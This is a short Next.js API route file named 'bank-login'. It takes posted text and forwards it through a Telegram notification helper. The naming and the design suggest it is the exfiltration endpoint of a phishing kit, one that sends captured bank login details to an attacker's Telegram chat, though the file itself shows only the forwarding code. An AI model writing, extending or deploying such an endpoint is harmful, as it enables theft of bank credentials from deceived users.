// app/api/bank-login/route.ts
import { NextResponse } from 'next/server';
import {sendTelegramNotification} from '@/app/lib/sendTelegramNotification';

export async function POST(req: Request) {
  const { text } = await req.json();

  try {
    await sendTelegramNotification(text);
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Bank login Telegram error:', error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
